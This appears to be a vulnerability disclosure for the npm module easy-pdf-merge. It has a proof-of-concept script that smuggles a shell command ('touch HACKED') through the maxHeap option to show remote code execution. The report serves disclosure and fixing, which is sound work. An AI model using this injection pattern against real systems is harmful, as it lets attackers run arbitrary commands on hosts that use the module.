# Description

The `easy-pdf-merge` module is vulnerable against `RCE` since `user supplied inputs` are formatted inside a command which is executed without prior checks.

# POC

1. Create the following PoC file:

```js
// poc.js
const merge = require('easy-pdf-merge');

merge(["test", "test1"], "test2", {maxHeap:"test; touch HACKED; #"}, function(err){
  if(err) {
    return console.log(err)
  }
  console.log('Success')
});

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i easy-pdf-merge # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
